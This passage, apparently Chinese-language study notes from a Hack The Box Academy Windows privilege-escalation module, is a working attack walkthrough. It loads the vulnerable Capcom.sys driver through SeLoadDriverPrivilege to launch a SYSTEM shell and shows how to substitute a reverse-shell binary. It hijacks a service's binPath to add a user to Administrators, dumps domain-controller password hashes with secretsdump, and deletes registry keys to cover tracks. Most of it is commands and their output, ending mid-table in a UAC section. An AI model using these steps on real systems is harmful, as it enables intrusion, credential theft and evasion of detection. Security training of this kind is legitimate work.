class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">whoami</span> /<span class="title">priv</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">PRIVILEGES</span> <span class="title">INFORMATION</span></span></span><br><span class="line"><span class="function">----------------------</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Privilege</span> <span class="title">Name</span>                <span class="title">Description</span>                          <span class="title">State</span></span></span><br><span class="line"><span class="function">============================= ==================================  ==========</span></span><br><span class="line"><span class="function"><span class="title">SeMachineAccountPrivilege</span>     <span class="title">Add</span> <span class="title">workstations</span> <span class="title">to</span> <span class="title">domain</span>           <span class="title">Disabled</span></span></span><br><span class="line"><span class="function"><span class="title">SeLoadDriverPrivilege</span>         <span class="title">Load</span> <span class="title">and</span> <span class="title">unload</span> <span class="title">device</span> <span class="title">drivers</span>       <span class="title">Disabled</span></span></span><br><span class="line"><span class="function"><span class="title">SeShutdownPrivilege</span>           <span class="title">Shut</span> <span class="title">down</span> <span class="title">the</span> <span class="title">system</span>       <span class="title">Disabled</span></span></span><br><span class="line"><span class="function"><span class="title">SeChangeNotifyPrivilege</span>       <span class="title">Bypass</span> <span class="title">traverse</span> <span class="title">checking</span>             <span class="title">Enabled</span></span></span><br><span class="line"><span class="function"><span class="title">SeIncreaseWorkingSetPrivilege</span> <span class="title">Increase</span> <span class="title">a</span> <span class="title">process</span> <span class="title">working</span> <span class="title">set</span>       <span class="title">Disabled</span></span></span><br></pre></td></tr></table></figure><p>驱动程序<code>Capcom.sys</code>包含允许任何用户以 SYSTEM 权限执行 shellcode 的功能。可以使用权限来加载此易受攻击的驱动程序并提升权限。可以使用<a href="https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp">此工具</a>来加载驱动程序。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winternl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sddl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;tchar.h&quot;</span></span></span><br></pre></td></tr></table></figure><p>下载到本地编辑并编译</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt;<span class="title">cl</span> /<span class="title">DUNICODE</span> /<span class="title">D_UNICODE</span> <span class="title">EnableSeLoadDriverPrivilege.cpp</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Microsoft</span> (<span class="title">R</span>) <span class="title">C</span>/<span class="title">C</span>++ <span class="title">Optimizing</span> <span class="title">Compiler</span> <span class="title">Version</span> 19.28.29913 <span class="title">for</span> <span class="title">x86</span></span></span><br><span class="line"><span class="function"><span class="title">Copyright</span> (<span class="title">C</span>) <span class="title">Microsoft</span> <span class="title">Corporation</span>.  <span class="title">All</span> <span class="title">rights</span> <span class="title">reserved</span>.</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">EnableSeLoadDriverPrivilege.cpp</span></span></span><br><span class="line"><span class="function"><span class="title">Microsoft</span> (<span class="title">R</span>) <span class="title">Incremental</span> <span class="title">Linker</span> <span class="title">Version</span> 14.28.29913.0</span></span><br><span class="line"><span class="function"><span class="title">Copyright</span> (<span class="title">C</span>) <span class="title">Microsoft</span> <span class="title">Corporation</span>.  <span class="title">All</span> <span class="title">rights</span> <span class="title">reserved</span>.</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">/<span class="title">out:EnableSeLoadDriverPrivilege</span>.<span class="title">exe</span></span></span><br><span class="line"><span class="function"><span class="title">EnableSeLoadDriverPrivilege.obj</span></span></span><br></pre></td></tr></table></figure><p>接下来，从<a href="https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys">此处</a>下载驱动程序，并将其保存到<code>C:\temp</code>。发出以下命令以在 HKEY_CURRENT_USER 树下添加对此驱动程序的引用。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">reg</span> <span class="title">add</span> <span class="title">HKCU</span>\<span class="title">System</span>\<span class="title">CurrentControlSet</span>\<span class="title">CAPCOM</span> /<span class="title">v</span> <span class="title">ImagePath</span> /<span class="title">t</span> <span class="title">REG_SZ</span> /<span class="title">d</span> &quot;\??\<span class="title">C</span>:\<span class="title">Tools</span>\<span class="title">Capcom.sys</span>&quot;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">The</span> <span class="title">operation</span> <span class="title">completed</span> <span class="title">successfully</span>.</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\&gt; <span class="title">reg</span> <span class="title">add</span> <span class="title">HKCU</span>\<span class="title">System</span>\<span class="title">CurrentControlSet</span>\<span class="title">CAPCOM</span> /<span class="title">v</span> <span class="title">Type</span> /<span class="title">t</span> <span class="title">REG_DWORD</span> /<span class="title">d</span> 1</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">The</span> <span class="title">operation</span> <span class="title">completed</span> <span class="title">successfully</span>.</span></span><br></pre></td></tr></table></figure><p>运行 <code>EnableSeLoadDriverPrivilege.exe</code></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">EnableSeLoadDriverPrivilege.exe</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">whoami</span>:</span></span><br><span class="line"><span class="function"><span class="title">INLANEFREIGHT0</span>\<span class="title">printsvc</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">whoami</span> /<span class="title">priv</span></span></span><br><span class="line"><span class="function"><span class="title">SeMachineAccountPrivilege</span>        <span class="title">Disabled</span></span></span><br><span class="line"><span class="function"><span class="title">SeLoadDriverPrivilege</span>            <span class="title">Enabled</span></span></span><br><span class="line"><span class="function"><span class="title">SeShutdownPrivilege</span>              <span class="title">Disabled</span></span></span><br><span class="line"><span class="function"><span class="title">SeChangeNotifyPrivilege</span>          <span class="title">Enabled</span> <span class="title">by</span> <span class="title">default</span></span></span><br><span class="line"><span class="function"><span class="title">SeIncreaseWorkingSetPrivilege</span>    <span class="title">Disabled</span></span></span><br><span class="line"><span class="function"><span class="title">NTSTATUS</span>: 00000000, <span class="title">WinError</span>: 0</span></span><br></pre></td></tr></table></figure><p>验证 Capcom 驱动程序是否已列出。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; .\DriverView.exe /stext drivers.txt</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">cat</span> drivers.txt | <span class="built_in">Select-String</span> <span class="literal">-pattern</span> Capcom</span><br><span class="line"></span><br><span class="line">Driver Name           : Capcom.sys</span><br><span class="line">Filename              : C:\Capcom.sys</span><br></pre></td></tr></table></figure><p>为了利用 Capcom.sys，可以用 Visual Studio 编译后使用<a href="https://github.com/tandasat/ExploitCapcom">ExploitCapcom工具。</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; .\ExploitCapcom.exe</span><br><span class="line"></span><br><span class="line">[*] Capcom.sys exploit</span><br><span class="line">[*] Capcom.sys handle was obained as <span class="number">0000000000000070</span></span><br><span class="line">[*] Shellcode was placed at <span class="number">0000024822</span>A50008</span><br><span class="line">[+] Shellcode was executed</span><br><span class="line">[+] Token stealing was successful</span><br><span class="line">[+] The SYSTEM shell was launched</span><br></pre></td></tr></table></figure><p>这将启动具有 SYSTEM 权限的 shell</p><p><img src="https://academy.hackthebox.com/storage/modules/67/capcomexploit.png" alt="capcomexploit"></p><h3 id="替代利用-无GUI"><a href="#替代利用-无GUI" class="headerlink" title="替代利用-无GUI"></a>替代利用-无GUI</h3><p>如果无法通过 GUI 访问目标，则必须在编译之前修改<code>ExploitCapcom.cpp</code>代码。在这里，可以编辑第 292 行，并将其<code>&quot;C:\Windows\\system32\\cmd.exe&quot;</code>替换为<code>msfvenom</code>创建的反向 shell 二进制文件，例如：<code>c:\ProgramData\revshell.exe</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Launches a command shell process</span></span><br><span class="line"><span class="type">static</span> <span class="type">bool</span> <span class="title function_">LaunchShell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    TCHAR CommandLine[] = TEXT(<span class="string">&quot;C:\Windows\\system32\\cmd.exe&quot;</span>);</span><br><span class="line">    PROCESS_INFORMATION ProcessInfo;</span><br><span class="line">    STARTUPINFO StartupInfo = &#123; <span class="keyword">sizeof</span>(StartupInfo) &#125;;</span><br><span class="line">    <span class="keyword">if</span> (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,</span><br><span class="line">        CREATE_NEW_CONSOLE, nullptr, nullptr, &amp;StartupInfo,</span><br><span class="line">        &amp;ProcessInfo))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    CloseHandle(ProcessInfo.hThread);</span><br><span class="line">    CloseHandle(ProcessInfo.hProcess);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>更改为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TCHAR CommandLine[] = TEXT(<span class="string">&quot;C:\ProgramData\\revshell.exe&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="EopLoadDriver-自动化"><a href="#EopLoadDriver-自动化" class="headerlink" title="EopLoadDriver 自动化"></a>EopLoadDriver 自动化</h3><p><a href="https://github.com/TarlogicSecurity/EoPLoadDriver/">EoPLoadDriver</a>工具可以自动执行启用特权、创建注册表项以及执行<code>NTLoadDriver</code>加载驱动程序的过程。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">EoPLoadDriver.exe</span> <span class="title">System</span>\<span class="title">CurrentControlSet</span>\<span class="title">Capcom</span> <span class="title">c</span>:\<span class="title">Tools</span>\<span class="title">Capcom.sys</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">[+] <span class="title">Enabling</span> <span class="title">SeLoadDriverPrivilege</span></span></span><br><span class="line"><span class="function">[+] <span class="title">SeLoadDriverPrivilege</span> <span class="title">Enabled</span></span></span><br><span class="line"><span class="function">[+] <span class="title">Loading</span> <span class="title">Driver</span>: \<span class="title">Registry</span>\<span class="title">User</span>\<span class="title">S</span>-1-5-21-454284637-3659702366-2958135535-1103\<span class="title">System</span>\<span class="title">CurrentControlSet</span>\<span class="title">Capcom</span></span></span><br><span class="line"><span class="function"><span class="title">NTSTATUS</span>: <span class="title">c000010e</span>, <span class="title">WinError</span>: 0</span></span><br></pre></td></tr></table></figure><p>然后将运行<code>ExploitCapcom.exe</code>弹出 SYSTEM shell 或运行自定义二进制文件。</p><h3 id="Clean-1"><a href="#Clean-1" class="headerlink" title="Clean"></a>Clean</h3><p>通过删除之前添加的注册表项来掩盖踪迹。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">reg</span> <span class="title">delete</span> <span class="title">HKCU</span>\<span class="title">System</span>\<span class="title">CurrentControlSet</span>\<span class="title">Capcom</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Permanently</span> <span class="title">delete</span> <span class="title">the</span> <span class="title">registry</span> <span class="title">key</span> <span class="title">HKEY_CURRENT_USER</span>\<span class="title">System</span>\<span class="title">CurrentControlSet</span>\<span class="title">Capcom</span> (<span class="title">Yes</span>/<span class="title">No</span>)? <span class="title">Yes</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">The</span> <span class="title">operation</span> <span class="title">completed</span> <span class="title">successfully</span>.</span></span><br></pre></td></tr></table></figure><blockquote><p>注意：自 Windows 10 版本 1803 起，SeLoadDriverPrivilege 不可利用，因为不再可能包含对  HKEY_CURRENT_USER 下注册表项的引用。</p></blockquote><h2 id="Server-Operators"><a href="#Server-Operators" class="headerlink" title="Server Operators"></a>Server Operators</h2><p><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators">服务器操作员</a>组允许成员管理 Windows 服务器，而无需分配域管理员权限。这是一个具有极高权限的组，可以本地登录到服务器，包括域控制器。</p><p>该团体的成员享有强大的<code>SeBackupPrivilege</code>特权<code>SeRestorePrivilege</code>和控制本地服务的能力。</p><p>检查一下该<code>AppReadiness</code>服务</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">sc</span> <span class="title">qc</span> <span class="title">AppReadiness</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">[<span class="title">SC</span>] <span class="title">QueryServiceConfig</span> <span class="title">SUCCESS</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">SERVICE_NAME</span>: <span class="title">AppReadiness</span></span></span><br><span class="line"><span class="function">        <span class="title">TYPE</span>               : 20  <span class="title">WIN32_SHARE_PROCESS</span></span></span><br><span class="line"><span class="function">        <span class="title">START_TYPE</span>         : 3   <span class="title">DEMAND_START</span></span></span><br><span class="line"><span class="function">        <span class="title">ERROR_CONTROL</span>      : 1   <span class="title">NORMAL</span></span></span><br><span class="line"><span class="function">        <span class="title">BINARY_PATH_NAME</span>   : <span class="title">C</span>:\<span class="title">Windows</span>\<span class="title">System32</span>\<span class="title">svchost.exe</span> -<span class="title">k</span> <span class="title">AppReadiness</span> -<span class="title">p</span></span></span><br><span class="line"><span class="function">        <span class="title">LOAD_ORDER_GROUP</span>   :</span></span><br><span class="line"><span class="function">        <span class="title">TAG</span>                : 0</span></span><br><span class="line"><span class="function">        <span class="title">DISPLAY_NAME</span>       : <span class="title">App</span> <span class="title">Readiness</span></span></span><br><span class="line"><span class="function">        <span class="title">DEPENDENCIES</span>       :</span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_START_NAME</span> : <span class="title">LocalSystem</span></span></span><br></pre></td></tr></table></figure><p>也可以使用服务查看器&#x2F;控制器<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psservice">PsService</a>（Sysinternals 套件的一部分）来检查服务的权限。<code>PsService</code>其工作原理与<code>sc</code>非常相似，可以显示服务状态和配置，还允许您在本地和远程主机上启动、停止、暂停、恢复和重新启动服务。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">c</span>:\<span class="title">Tools</span>\<span class="title">PsService.exe</span> <span class="title">security</span> <span class="title">AppReadiness</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">PsService</span> <span class="title">v2</span>.25 - <span class="title">Service</span> <span class="title">information</span> <span class="title">and</span> <span class="title">configuration</span> <span class="title">utility</span></span></span><br><span class="line"><span class="function"><span class="title">Copyright</span> (<span class="title">C</span>) 2001-2010 <span class="title">Mark</span> <span class="title">Russinovich</span></span></span><br><span class="line"><span class="function"><span class="title">Sysinternals</span> - <span class="title">www.sysinternals.com</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">SERVICE_NAME</span>: <span class="title">AppReadiness</span></span></span><br><span class="line"><span class="function"><span class="title">DISPLAY_NAME</span>: <span class="title">App</span> <span class="title">Readiness</span></span></span><br><span class="line"><span class="function">        <span class="title">ACCOUNT</span>: <span class="title">LocalSystem</span></span></span><br><span class="line"><span class="function">        <span class="title">SECURITY</span>:</span></span><br><span class="line"><span class="function">        [<span class="title">ALLOW</span>] <span class="title">NT</span> <span class="title">AUTHORITY</span>\<span class="title">SYSTEM</span></span></span><br><span class="line"><span class="function">                <span class="title">Query</span> <span class="title">status</span></span></span><br><span class="line"><span class="function">                <span class="title">Query</span> <span class="title">Config</span></span></span><br><span class="line"><span class="function">                <span class="title">Interrogate</span></span></span><br><span class="line"><span class="function">                <span class="title">Enumerate</span> <span class="title">Dependents</span></span></span><br><span class="line"><span class="function">                <span class="title">Pause</span>/<span class="title">Resume</span></span></span><br><span class="line"><span class="function">                <span class="title">Start</span></span></span><br><span class="line"><span class="function">                <span class="title">Stop</span></span></span><br><span class="line"><span class="function">                <span class="title">User</span>-<span class="title">Defined</span> <span class="title">Control</span></span></span><br><span class="line"><span class="function">                <span class="title">Read</span> <span class="title">Permissions</span></span></span><br><span class="line"><span class="function">        [<span class="title">ALLOW</span>] <span class="title">BUILTIN</span>\<span class="title">Administrators</span></span></span><br><span class="line"><span class="function">                <span class="title">All</span></span></span><br><span class="line"><span class="function">        [<span class="title">ALLOW</span>] <span class="title">NT</span> <span class="title">AUTHORITY</span>\<span class="title">INTERACTIVE</span></span></span><br><span class="line"><span class="function">                <span class="title">Query</span> <span class="title">status</span></span></span><br><span class="line"><span class="function">                <span class="title">Query</span> <span class="title">Config</span></span></span><br><span class="line"><span class="function">                <span class="title">Interrogate</span></span></span><br><span class="line"><span class="function">                <span class="title">Enumerate</span> <span class="title">Dependents</span></span></span><br><span class="line"><span class="function">                <span class="title">User</span>-<span class="title">Defined</span> <span class="title">Control</span></span></span><br><span class="line"><span class="function">                <span class="title">Read</span> <span class="title">Permissions</span></span></span><br><span class="line"><span class="function">        [<span class="title">ALLOW</span>] <span class="title">NT</span> <span class="title">AUTHORITY</span>\<span class="title">SERVICE</span></span></span><br><span class="line"><span class="function">                <span class="title">Query</span> <span class="title">status</span></span></span><br><span class="line"><span class="function">                <span class="title">Query</span> <span class="title">Config</span></span></span><br><span class="line"><span class="function">                <span class="title">Interrogate</span></span></span><br><span class="line"><span class="function">                <span class="title">Enumerate</span> <span class="title">Dependents</span></span></span><br><span class="line"><span class="function">                <span class="title">User</span>-<span class="title">Defined</span> <span class="title">Control</span></span></span><br><span class="line"><span class="function">                <span class="title">Read</span> <span class="title">Permissions</span></span></span><br><span class="line"><span class="function">        [<span class="title">ALLOW</span>] <span class="title">BUILTIN</span>\<span class="title">Server</span> <span class="title">Operators</span></span></span><br><span class="line"><span class="function">                <span class="title">All</span></span></span><br></pre></td></tr></table></figure><p>更改二进制路径来执行一个命令，将当前用户添加到默认本地管理员组。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">sc</span> <span class="title">config</span> <span class="title">AppReadiness</span> <span class="title">binPath</span>= &quot;<span class="title">cmd</span> /<span class="title">c</span> <span class="title">net</span> <span class="title">localgroup</span> <span class="title">Administrators</span> <span class="title">server_adm</span> /<span class="title">add</span>&quot;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">[<span class="title">SC</span>] <span class="title">ChangeServiceConfig</span> <span class="title">SUCCESS</span></span></span><br></pre></td></tr></table></figure><p>启动服务失败，这是预料之中的。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">sc</span> <span class="title">start</span> <span class="title">AppReadiness</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">[<span class="title">SC</span>] <span class="title">StartService</span> <span class="title">FAILED</span> 1053:</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">The</span> <span class="title">service</span> <span class="title">did</span> <span class="title">not</span> <span class="title">respond</span> <span class="title">to</span> <span class="title">the</span> <span class="title">start</span> <span class="title">or</span> <span class="title">control</span> <span class="title">request</span> <span class="title">in</span> <span class="title">a</span> <span class="title">timely</span> <span class="title">fashion</span>.</span></span><br></pre></td></tr></table></figure><p>检查管理员组的成员身份，会发现用户加入了管理员组。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">net</span> <span class="title">localgroup</span> <span class="title">Administrators</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Alias</span> <span class="title">name</span>     <span class="title">Administrators</span></span></span><br><span class="line"><span class="function"><span class="title">Comment</span>        <span class="title">Administrators</span> <span class="title">have</span> <span class="title">complete</span> <span class="title">and</span> <span class="title">unrestricted</span> <span class="title">access</span> <span class="title">to</span> <span class="title">the</span> <span class="title">computer</span>/<span class="title">domain</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Members</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">-------------------------------------------------------------------------------</span></span><br><span class="line"><span class="function"><span class="title">Administrator</span></span></span><br><span class="line"><span class="function"><span class="title">Domain</span> <span class="title">Admins</span></span></span><br><span class="line"><span class="function"><span class="title">Enterprise</span> <span class="title">Admins</span></span></span><br><span class="line"><span class="function"><span class="title">server_adm</span></span></span><br><span class="line"><span class="function"><span class="title">The</span> <span class="title">command</span> <span class="title">completed</span> <span class="title">successfully</span>.</span></span><br></pre></td></tr></table></figure><p>从这里，可以完全控制域控制器，可以从 NTDS 数据库检索所有凭据并访问其他系统，并执行后利用任务。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ crackmapexec smb 10.129.43.9 -u server_adm -p &#x27;HTB_@cademy_stdnt!&#x27;</span><br><span class="line"></span><br><span class="line">SMB         10.129.43.9     445    WINLPE-DC01      [*] Windows 10.0 Build 17763 (name:WINLPE-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.129.43.9     445    WINLPE-DC01      [+] INLANEFREIGHT.LOCAL\server_adm:HTB_@cademy_stdnt! (Pwn3d!)</span><br></pre></td></tr></table></figure><p>从域控制器检索 NTLM 密码哈希</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator</span><br><span class="line"></span><br><span class="line">Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::</span><br><span class="line">[*] Kerberos keys grabbed</span><br><span class="line">Administrator:aes256-cts-hmac-sha1-96:5db9c9ada113804443a8aeb64f500cd3e9670348719ce1436bcc95d1d93dad43</span><br><span class="line">Administrator:aes128-cts-hmac-sha1-96:94c300d0e47775b407f2496a5cca1a0a</span><br><span class="line">Administrator:des-cbc-md5:d60dfbbf20548938</span><br><span class="line">[*] Cleaning up...</span><br></pre></td></tr></table></figure><hr><h1 id="User-Account-Control"><a href="#User-Account-Control" class="headerlink" title="User Account Control"></a>User Account Control</h1><p><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works">用户帐户控制 (UAC)</a>是一种功能，可针对高级活动启用同意提示。应用程序有不同的<code>integrity</code>级别，具有高级别的程序可以执行可能危害系统的任务。启用 UAC 后，应用程序和任务始终在非管理员帐户的安全上下文中运行，除非管理员明确授权这些应用程序&#x2F;任务以管理员级别的权限运行系统。</p><table><thead><tr><th>组策略设置</th><th>注册表项</th><th>默认设置</th></tr></thead><tbody><tr><td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account">用户帐户控制：内置管理员帐户的管理员批准模式</a></td><td>FilterAdministratorToken</td><td>已禁用</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop">用户帐户控制：允许 UIAccess 应用程序在不使用安全桌面的情况下提示提升权限</a></td><td>EnableUIADesktopToggle</td><td>已禁用</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode">用户帐户控制: 管理员批准模式下管理员的提升权限提示行为</a></td><td>ConsentPromptBehaviorAdmin</td><td>提示同意非 Windows 二进制文件</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users">用户帐户控制：标准用户的提升提示行为</a></td><td>ConsentPromptBehaviorUser</td><td>在安全桌面上提示输入凭据</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation">用户帐户控制: 检测应用程序安装并提示提升权限</a></td><td>EnableInstallerDetection</td><td>已启用（家庭默认） 